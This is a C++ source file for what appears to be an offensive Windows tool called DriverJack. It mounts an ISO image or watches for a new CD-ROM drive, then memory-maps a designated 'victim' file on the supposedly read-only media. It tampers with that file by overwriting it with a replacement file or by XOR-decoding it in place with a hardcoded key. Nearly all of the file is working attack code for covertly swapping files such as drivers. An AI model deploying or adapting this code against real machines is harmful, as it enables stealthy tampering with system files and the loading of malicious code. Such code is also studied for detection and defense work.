// DriverJack.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <inttypes.h>
#include <initguid.h>
#include <windows.h>
#include <cstdio>
#include <string>
#include <vector>
#include <virtdisk.h>
#include <shlwapi.h>
#include "stringutils.h"
#include "IoCdfsLib.h"
#include "crypt.h"


#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "virtdisk.lib")

// Function to mount an ISO file using AttachVirtualDisk
HANDLE MountISO(const std::string& isoPath) {

    DWORD LastError = 0;

    VIRTUAL_STORAGE_TYPE storageType = {};
    storageType.DeviceId = VIRTUAL_STORAGE_TYPE_DEVICE_ISO;
    storageType.VendorId = VIRTUAL_STORAGE_TYPE_VENDOR_UNKNOWN;

    ATTACH_VIRTUAL_DISK_PARAMETERS attachParameters = {};
    attachParameters.Version = ATTACH_VIRTUAL_DISK_VERSION_1;

    OPEN_VIRTUAL_DISK_PARAMETERS openParameters;
    openParameters.Version = OPEN_VIRTUAL_DISK_VERSION_1;
    openParameters.Version1.RWDepth = OPEN_VIRTUAL_DISK_RW_DEPTH_DEFAULT;

    HANDLE virtualDiskHandle;
    PCWSTR isoPathWide = (PCWSTR)AnsiToWide(isoPath.c_str());

    printf("(*) Attempting to open: %ws\n", isoPathWide);
    /*
        DWORD OpenVirtualDisk(
            [in]           PVIRTUAL_STORAGE_TYPE         VirtualStorageType,
            [in]           PCWSTR                        Path,
            [in]           VIRTUAL_DISK_ACCESS_MASK      VirtualDiskAccessMask,
            [in]           OPEN_VIRTUAL_DISK_FLAG        Flags,
            [in, optional] POPEN_VIRTUAL_DISK_PARAMETERS Parameters,
            [out]          PHANDLE                       Handle
        );
    */
    LastError = OpenVirtualDisk(&storageType, isoPathWide, VIRTUAL_DISK_ACCESS_GET_INFO | VIRTUAL_DISK_ACCESS_ATTACH_RO | VIRTUAL_DISK_ACCESS_DETACH, OPEN_VIRTUAL_DISK_FLAG_NONE, &openParameters, &virtualDiskHandle);

    if (LastError != ERROR_SUCCESS) {
        // If return value of OpenVirtualDisk isn't ERROR_SUCCESS, there was a problem opening the VHD
        printf("(-) Error Opening Virtual Disk: %08x\n", LastError);
        return nullptr;
    }

    /*
        DWORD AttachVirtualDisk(
            [in]           HANDLE                          VirtualDiskHandle,
            [in, optional] PSECURITY_DESCRIPTOR            SecurityDescriptor,
            [in]           ATTACH_VIRTUAL_DISK_FLAG        Flags,
            [in]           ULONG                           ProviderSpecificFlags,
            [in, optional] PATTACH_VIRTUAL_DISK_PARAMETERS Parameters,
            [in, optional] LPOVERLAPPED                    Overlapped
        );
    */
    LastError = AttachVirtualDisk(virtualDiskHandle, 0, ATTACH_VIRTUAL_DISK_FLAG_READ_ONLY | ATTACH_VIRTUAL_DISK_FLAG_PERMANENT_LIFETIME, 0, &attachParameters, 0);

    if (LastError != ERROR_SUCCESS) {
        // If return value of AttachVirtualDisk isn't ERROR_SUCCESS, there was a problem attach the disk
        printf("(-) Error Attaching Virtual Disk: %08x\n", LastError);
        DetatchVirtualImage(virtualDiskHandle);
        return nullptr;
    }

    // Close the handle as we don't need it for further operations
    // CloseHandle(virtualDiskHandle);
    return virtualDiskHandle;

}

PWSTR GetPhysicalDrivePath(HANDLE virtualDiskHandle) {
    DWORD LastError = 0;
    WCHAR physicalDrive[MAX_PATH];
    WCHAR* physicalDriveContainer = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR));
    memset(physicalDriveContainer, MAX_PATH * sizeof(WCHAR), 0);
    ULONG bufferSize = sizeof(physicalDrive);

    /*
            DWORD GetVirtualDiskPhysicalPath(
                [in]  HANDLE VirtualDiskHandle,
                [out] PULONG DiskPathSizeInBytes,
                [out] PWSTR  DiskPath
            );
    */
    LastError = GetVirtualDiskPhysicalPath(virtualDiskHandle, &bufferSize, physicalDrive);

    if (LastError != ERROR_SUCCESS) {
        // If return value of GetVirtualDiskPhysicalPath isn't ERROR_SUCCESS, there was a problem getting the physical path
        printf("(-) Error Getting Physical Path: %08x\n", LastError);
        return nullptr;
    }
    if (physicalDriveContainer != nullptr) {
        memcpy(physicalDriveContainer, physicalDrive, bufferSize);
    }

    return physicalDriveContainer;
}

bool DetatchVirtualImage(HANDLE virtualImageHandle) {
    DWORD LastError = 0;

    LastError = DetachVirtualDisk(virtualImageHandle, DETACH_VIRTUAL_DISK_FLAG_NONE, 0);

    if (LastError != ERROR_SUCCESS) {
        // If return value of AttachVirtualDisk isn't ERROR_SUCCESS, there was a problem attach the disk
        printf("(-) Error Attaching Virtual Disk: %08x\n", LastError);
        return false;
    }
    return true;

}

VOID GetDevicePathFromDriveLetter(wchar_t driveLetter, LPWSTR devicePath, DWORD maxLength) {
    wchar_t driveName[] = L"X:";
    driveName[0] = driveLetter;
	printf("(*) Querying DOS device for drive %ws\n", driveName);

    DWORD result = QueryDosDeviceW(driveName, devicePath, maxLength);
    if (result == 0) {
        DWORD error = GetLastError();
        fwprintf(stderr, L"Error querying DOS device: %lu\n", error);
    }
}

// Function to find the drive letter of the mounted ISO
char FindMountedDriveLetter(DWORD driveNumber) {
    DWORD  bufferSize = MAX_PATH;
    char volumeName[MAX_PATH];
    char driveLetter = 'X';
    bool hadTrailingBackslash = false;

    HANDLE findHandle = FindFirstVolumeA(volumeName, bufferSize);
    if (findHandle == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "FindFirstVolume failed with error code %ld\n", GetLastError());
        return '\0';
    }

    do {
        size_t index = strlen(volumeName) - 1;
        if (volumeName[0] != '\\' || volumeName[1] != '\\' || volumeName[2] != '?' || volumeName[3] != '\\' || volumeName[index] != '\\') {
            fprintf(stderr, "Incorrect volume name format: %s\n", volumeName);
            continue;
        }

        if (hadTrailingBackslash = volumeName[index] == '\\') {
            volumeName[index] = 0;
        }

        HANDLE hVolume = CreateFileA(volumeName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hVolume == INVALID_HANDLE_VALUE) {
            fprintf(stderr, "CreateFile failed with error code %ld\n", GetLastError());
            continue;
        }

        VOLUME_DISK_EXTENTS diskExtents;
        DWORD bytesReturned;
        BOOL success = DeviceIoControl(hVolume, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, NULL, 0, &diskExtents, sizeof(diskExtents), &bytesReturned, NULL);
        if (!success) {
            fprintf(stderr, "DeviceIoControl failed with error code %ld\n", GetLastError());
            CloseHandle(hVolume);
            continue;
        }

        printf("(*) Disk number: %d\n", diskExtents.Extents[0].DiskNumber);
        printf("(*) Volume name: %s\n", volumeName);

        if (diskExtents.Extents[0].DiskNumber == driveNumber) {
            if (hadTrailingBackslash) {
                volumeName[index] = '\\';
            }
            printf("(+) Found drive at %s\n", volumeName);
            SetVolumeMountPointA("X:\\", volumeName);

            //driveLetter = volumeName[4];
            break;

        }
        CloseHandle(hVolume);
    } while (FindNextVolumeA(findHandle, volumeName, bufferSize));

    FindVolumeClose(findHandle);
    return driveLetter; // No match, damn it!
}


void* FileToBuffer(const std::string& filePath, PLARGE_INTEGER lpFileSize) {
    // Convert file path to wide string
    std::wstring wFilePath(filePath.begin(), filePath.end());

	printf("(*) Reading file: %ws\n", wFilePath.c_str());

    // Open the file
    HANDLE hFile = CreateFileW(
        wFilePath.c_str(),            // File path
        GENERIC_READ,                 // Desired access
        FILE_SHARE_READ,              // Share mode
        NULL,                         // Security attributes
        OPEN_EXISTING,                // Creation disposition
        FILE_ATTRIBUTE_NORMAL,        // Flags and attributes
        NULL                          // Template file
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return nullptr;
    }

    // Get the file size
    if (!GetFileSizeEx(hFile, lpFileSize)) {
        CloseHandle(hFile);
        return nullptr;
    }

    // Allocate buffer
    DWORD fileSize = static_cast<DWORD>(lpFileSize->QuadPart);

    printf("(*) File size: %d\n", fileSize);

    void* buffer = malloc(fileSize);
    if (buffer == nullptr) {
        CloseHandle(hFile);
        return nullptr;
    }

    // Read the file content
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        free(buffer);
        CloseHandle(hFile);
        return nullptr;
    }

    if (bytesRead != fileSize) {
        free(buffer);
        CloseHandle(hFile);
        return nullptr;
    }

    // Close the file
    CloseHandle(hFile);

    return buffer;
}


// Function to map a file in memory
void* MapFileInMemory(const std::string& filePath, PLARGE_INTEGER lpFileSize) {
    HANDLE hFile = CreateFileA(filePath.c_str(), MAXIMUM_ALLOWED, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error opening file: %ld\n", GetLastError());
        return nullptr;
    }

    DWORD LastError = GetFileSizeEx(hFile, lpFileSize);
    if (LastError == 0) {
        fprintf(stderr, "Error getting file size: %ld\n", GetLastError());
    }

    HANDLE hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    if (hMapFile == NULL) {
        fprintf(stderr, "Error creating file mapping: %ld\n", GetLastError());
        CloseHandle(hFile);
        return nullptr;
    }

    void* pMapView = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (pMapView == NULL) {
        fprintf(stderr, "Error mapping view of file: %ld\n", GetLastError());
        CloseHandle(hMapFile);
        CloseHandle(hFile);
        return nullptr;
    }

    CloseHandle(hMapFile);
    CloseHandle(hFile);
    return pMapView;
}


std::vector<std::string> getListOfDrives() {
    std::vector<std::string> arrayOfDrives;
    char* szDrives = new char[MAX_PATH]();
    if (GetLogicalDriveStringsA(MAX_PATH, szDrives)) {
        for (int i = 0; i < 100; i += 4) {
            if (szDrives[i] != (char)0) {
                arrayOfDrives.push_back(std::string{ szDrives[i],szDrives[i + 1],szDrives[i + 2] });
            }
        }
    }
    delete[] szDrives;
    return arrayOfDrives;
}


LPSTR WaitForDrive() {
	std::vector<std::string> drives = getListOfDrives();
	std::vector<std::string> drives2;
	LPSTR drivePath = (LPSTR)malloc(MAX_PATH);
	if (drivePath == nullptr) {
		return nullptr;
	}
	while (true) {
		drives2 = getListOfDrives();

		for (auto drive : drives2) {
			bool found = false;
			for (auto drive2 : drives) {
				if (drive == drive2) {
                    found = true;
                    break;
				}
			}
			if (!found) {
                UINT driveType = GetDriveTypeA(drive.c_str());
                if (driveType == DRIVE_CDROM) {
                    memcpy(drivePath, (LPSTR)drive.c_str(), 4);
                    return drivePath;
                }
                else {
                    found = true;
                    break;
                }
			}
		}
		drives = drives2;
		Sleep(3000);
	}
	return nullptr;
}

BOOL CompareFileToBuffer(std::string& fullDrivePath, void* replaceBuffer, unsigned int replaceBufferLen) {

    printf("(*) Checking file %s in mapped drive...\n", fullDrivePath.c_str());
    LARGE_INTEGER fileSize;
    PVOID pFile = MapFileInMemory(fullDrivePath, &fileSize);

    UINT64 fileSize64 = fileSize.QuadPart;
	BOOL bSuccess = FALSE;

    if (pFile != nullptr) {
        printf("(*) File mapped in memory at address: %p\n", pFile);
		if (memcmp(pFile, replaceBuffer, replaceBufferLen) == 0) {
			printf("(*) File content matches buffer\n");
			bSuccess = TRUE;
		}
        else {
			printf("(-) File content does not match buffer\n");
			bSuccess = FALSE;
		}
        
        FlushViewOfFile(pFile, fileSize.QuadPart);
        UnmapViewOfFile(pFile);
    }

    return bSuccess;
}


BOOL OverwriteFileWithBuffer(std::string& fullDrivePath, void* replaceBuffer, unsigned int replaceBufferLen) {

    printf("(*) Modifying file %s in mapped drive...\n", fullDrivePath.c_str());
    LARGE_INTEGER fileSize;
    PVOID pFile = MapFileInMemory(fullDrivePath, &fileSize);

    UINT64 fileSize64 = fileSize.QuadPart;
    DWORD oldProtect;

    if (pFile != nullptr) {
        printf("(*) File mapped in memory at address: %p\n", pFile);
        printf("(*) File content: %08x\n", *(UINT*)pFile);
        printf("(*) Tampering %" PRIu64 " bytes of file content...\n", fileSize64);

        memset(pFile, 0x90, fileSize64);

        printf("(*) Rewriting %u bytes of file content...\n", replaceBufferLen);
        VirtualProtect(pFile, fileSize.QuadPart, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(pFile, replaceBuffer, replaceBufferLen);

        printf("(*) File content: %08x\n", *(UINT*)pFile);
        printf("(*) Modified %" PRIu64 " bytes of content : % 08x\n", fileSize64, *(UINT*)pFile);

        FlushViewOfFile(pFile, fileSize.QuadPart);
        UnmapViewOfFile(pFile);
        return TRUE;

    }
    return FALSE;

}

BOOL ReplaceFileWith(std::string& drivePath, char* file, char* replaceWith) {

    std::string innerFilePath = std::string(file);
    std::string replaceFilePath = std::string(replaceWith);
    LARGE_INTEGER fileSize;

    drivePath.append(innerFilePath);
    
    void* buffer = FileToBuffer(replaceFilePath, &fileSize);
    if (buffer == nullptr) {
        printf("(-) Error reading file: %ld\n", GetLastError());
        return FALSE;
    }

    BOOL bSuccess = OverwriteFileWithBuffer(innerFilePath, buffer, (DWORD)fileSize.QuadPart);
	free(buffer);
    return bSuccess;

}

BOOL XorDecryptFile(std::string& drivePath, char* file, char* key) {
    std::string xor_key = std::string(key);

    if(file != NULL){
        std::string innerFilePath = std::string(file);
        drivePath.append(innerFilePath);
    }

    printf("(*) Modifying file %s in mapped drive...\n", drivePath.c_str());
    LARGE_INTEGER fileSize;
    PVOID pFile = MapFileInMemory(drivePath, &fileSize);

    UINT64 fileSize64 = fileSize.QuadPart;

    if (pFile != nullptr) {
        printf("(*) File mapped in memory at address: %p\n", pFile);
        printf("(*) File content: %08x\n", *(UINT*)pFile);
        printf("(*) Decrypting %" PRIu64 " bytes of file content using key '%s' of length %u...\n", fileSize64, xor_key.c_str(), (DWORD)xor_key.size());
        xor_encode(pFile, fileSize64, key, (DWORD)xor_key.size());
        printf("(*) Modified %" PRIu64 " bytes of content : %08x\n", fileSize64, *(UINT*)pFile);

        FlushViewOfFile(pFile, fileSize.QuadPart);
        UnmapViewOfFile(pFile);

        return TRUE;

    }
    return FALSE;
}


VOID MountAndTamper(char* rawIso, char* innerFile, char* action, char* replacePath, BOOL detachOnFinish) {
    // Path to ISO file
    std::string isoPath = std::string(rawIso);
    // Get list of drives before mounting ISO
    std::vector<std::string> drives = getListOfDrives();
    // Drive letter of mounted ISO
    std::string drivePath;

    HANDLE vhd = MountISO(isoPath);

    for (auto drive : getListOfDrives()) {
        bool found = false;
        for (auto drive2 : drives) {
            if (drive == drive2) {
                found = true;
                break;
            }
        }
        if (!found) {
            printf("(>) New Drive: %s\n", drive.c_str());
            drivePath = drive;
        }
    }

    if (vhd != nullptr) {
        
        PWSTR physicalDrive = GetPhysicalDrivePath(vhd);
        DWORD driveNumber = ExtractNumberFromPath(physicalDrive);

        wprintf(L"(*) Physical Drive: %s\n", physicalDrive);
        printf("(*) Drive Number: %d\n", driveNumber);
        printf("(*) Mounted Drive Letter: %s\n", drivePath.c_str());
        getchar();
        JustTamper((char*)drivePath.c_str(), innerFile, action, replacePath);
        
		if (detachOnFinish) {
			DetatchVirtualImage(vhd);
		}
    }
}

VOID WaitForDriveAndTamper(char* innerFile, char* action, char* replacePath, BOOL detachOnFinish) {
    
	LPSTR pDrivePath = WaitForDrive();

	if (pDrivePath != NULL) {
		printf("(+) Drive Found: %s\n", pDrivePath);
	}
	else {
		printf("(-) Error Finding Drive\n");
        return;
	}
    wchar_t driveLetter;
    size_t convertedChars = 0;

    // Convert the first character to a wide character
    mbstowcs_s(&convertedChars, &driveLetter, 2, pDrivePath, 1);
    if (convertedChars == 0) {
        fprintf(stderr, "Error converting drive letter to wide character.\n");
        return;
    }

    LPWSTR physicalDrive = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
    GetDevicePathFromDriveLetter(driveLetter, physicalDrive, MAX_PATH);
    DWORD driveNumber = ExtractNumberFromPath(physicalDrive);

    std::string drivePath = std::string(pDrivePath);
    wprintf(L"(*) Physical Drive: %s\n", physicalDrive);
    printf("(*) Drive Number: %d\n", driveNumber);
    printf("(*) Mounted Drive Letter: %s\n", drivePath.c_str());
    getchar();


	JustTamper(pDrivePath, innerFile, action, replacePath);

}

VOID InfoAndTamper(char* pDrivePath, char* filePath, char* action, char* replacePath) {
    if (pDrivePath != NULL) {
        printf("(+) Drive Found: %s\n", pDrivePath);
    }
    else {
        printf("(-) Error Finding Drive\n");
        return;
    }
    wchar_t driveLetter;
    size_t convertedChars = 0;

    // Convert the first character to a wide character
    mbstowcs_s(&convertedChars, &driveLetter, 2, pDrivePath, 1);
    if (convertedChars == 0) {
        fprintf(stderr, "Error converting drive letter to wide character.\n");
        return;
    }

    LPWSTR physicalDrive = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
    GetDevicePathFromDriveLetter(driveLetter, physicalDrive, MAX_PATH); 
    DWORD driveNumber = ExtractNumberFromPath(physicalDrive);

    std::string drivePath = std::string(pDrivePath);
    wprintf(L"(*) Physical Drive: %s\n", physicalDrive);
    printf("(*) Drive Number: %d\n", driveNumber);
    printf("(*) Mounted Drive Letter: %s\n", drivePath.c_str());
    getchar();

	JustTamper(pDrivePath, filePath, action, replacePath);
    
}


VOID JustTamper(char* pDrivePath, char* filePath, char* action, char* replacePath) {

    if (pDrivePath != NULL) {
        printf("(+) Target Drive: %s\n", pDrivePath);
    }
    else {
        printf("(-) Error Finding Drive\n");
        return;
    }

    std::string drivePath = std::string(pDrivePath);
    getchar();

    if (strcmp(action, "xor") == 0) {

        if (XorDecryptFile(drivePath, filePath, (char*)"Microsoft")) {
            printf("(+) File Decrypted\n");
        }
        else {
            printf("(-) Error Decrypting File\n");
        }
    }
    else if (strcmp(action, "replace") == 0) {
        if (ReplaceFileWith(drivePath, filePath, replacePath)) {
            printf("(+) File Replaced\n");
        }
        else {
            printf("(-) Error Replacing File\n");
        }
    }

}

void CopyFileTo(char* victim, char* copyto) {
	std::string victimPath = std::string(victim);
	std::string copytoPath = std::string(copyto);

	printf("(*) Copying file %s to %s\n", victimPath.c_str(), copytoPath.c_str());

	LARGE_INTEGER fileSize;
	void* buffer = FileToBuffer(victimPath, &fileSize);
	if (buffer == nullptr) {
		printf("(-) Error reading file: %ld\n", GetLastError());
		return;
	}

	HANDLE targetFile = CreateFileA(
        copytoPath.c_str(), 
        MAXIMUM_ALLOWED, 
        FILE_SHARE_DELETE | FILE_SHARE_READ| FILE_SHARE_WRITE, 
        NULL, 
        CREATE_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS, 
        NULL
    );

	if (targetFile == INVALID_HANDLE_VALUE) {
		printf("(-) Error creating file: %ld\n", GetLastError());
		return;
	}

	DWORD bytesWritten;
    if (!WriteFile(targetFile, buffer, (DWORD)fileSize.QuadPart, &bytesWritten, NULL)) {
		printf("(-) Error writing file: %ld\n", GetLastError());
        return;
    }
	printf("(+) File copied successfully\n");

}


/*
void printHelp() {
    printf("Usage: program [options]\n");
    printf("Options:\n");
    printf("  -action   <str>     Specify the action to perform (xor, replace)\n");
    printf("  -drive    <str>     Specify the drive letter\n");
    printf("  -iso      <file>    Specify an ISO file to mount\n");
    printf("  -victim   <file>    Specify the victim file\n");
    printf("  -replace  <file>    Specify the replacement file\n");
    printf("  -copy     <path>    Specify a local path to copy the file in\n");
    printf("  -wait               Specify to listen for new drives\n");
    printf("  -help               Display this help message\n");
}



int main(int argc, char* argv[]) {
    char* action = nullptr;
    char* drive = nullptr;
    char* iso = nullptr;
    char* victim = nullptr;
    char* replace = nullptr;
    char* copyto = nullptr;
    bool wait = false;

    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-action") == 0 && i + 1 < argc) {
            action = argv[++i];
        }
        else if (strcmp(argv[i], "-drive") == 0 && i + 1 < argc) {
            drive = argv[++i];
        }
        else if (strcmp(argv[i], "-iso") == 0 && i + 1 < argc) {
            iso = argv[++i];
        }
        else if (strcmp(argv[i], "-victim") == 0 && i + 1 < argc) {
            victim = argv[++i];
        }
        else if (strcmp(argv[i], "-replace") == 0 && i + 1 < argc) {
            replace = argv[++i];
        }
        else if (strcmp(argv[i], "-copyto") == 0 && i + 1 < argc) {
            copyto = argv[++i];
        }
        else if (strcmp(argv[i], "-wait") == 0) {
            wait = true;
        }
        else if (strcmp(argv[i], "-help") == 0) {
            printHelp();
            return 0;
        }
        else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            printHelp();
            return 1;
        }
    }

    if (victim == nullptr){ // || !isValidFileName(std::string(victim))) {
        fprintf(stderr, "Victim file must be specified and be a relative path or just a filename.\n");
        printHelp();
        return 1;
    }

    if (action != nullptr && strcmp(action, "replace") == 0 && replace == nullptr) {
        fprintf(stderr, "Replace file must be specified when action is 'replace'.\n");
        printHelp();
        return 1;
    }

    // Print the configuration summary
    printf("(I) ISO File: %s\n", iso != nullptr ? iso : "Not specified");
    printf("(I) Drive Name File: %s\n", drive != nullptr ? drive : "Not specified");
    printf("(I) Copy To Path: %s\n", copyto != nullptr ? copyto : "Not specified");
    printf("(I) Victim Drive Name File: %s\n", victim);
    printf("(I) Action: %s\n", action != nullptr ? action : "Not specified");

    if (drive != nullptr) {
        InfoAndTamper(drive, victim, action, replace);
    }
    else {
        if (iso != nullptr) {
            MountAndTamper(iso, victim, action, replace, FALSE);
        }
        else if (!wait) {
            wait = true;
        }

        if (wait) {
			WaitForDriveAndTamper(victim, action, replace, FALSE);
        }
    }

	if (copyto != nullptr) {
		printf("Copying file to %s\n", copyto);
		CopyFileTo(victim, copyto);
	}

    printf("(*) Press a button to end the program...\n");
    getchar();
    return 0;
}

*/